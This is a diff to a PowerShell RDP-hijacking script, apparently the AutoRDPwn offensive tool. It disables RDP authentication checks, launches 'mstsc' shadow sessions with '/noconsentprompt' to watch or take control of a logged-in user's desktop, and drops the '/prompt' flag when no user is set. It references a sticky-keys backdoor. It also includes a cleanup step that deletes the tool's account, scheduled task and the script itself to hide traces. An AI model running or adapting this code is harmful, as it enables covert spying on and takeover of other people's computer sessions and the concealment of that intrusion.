@@ -519,8 +519,9 @@ if($Language -in 'Spanish') {
         (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
         Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
         $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine()
-        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
+        if($stickykeys){ mstsc /v $computer /admin /f }
+        if($control -eq 'true') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+        else { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
         else { Write-Host "$version $txt37" -ForegroundColor Red
         invoke-command -session $RDP[0] -scriptblock {
@@ -544,8 +545,9 @@ if($Language -in 'Spanish') {
 
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
     $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt35" -ForegroundColor Blue ; sleep -milliseconds 2500
-    if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
-    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}
+    if($stickykeys){ mstsc /v $computer /admin /f }
+    if($control -eq 'true') { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+    else { if(!$user){ mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
 if ($hash){ invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
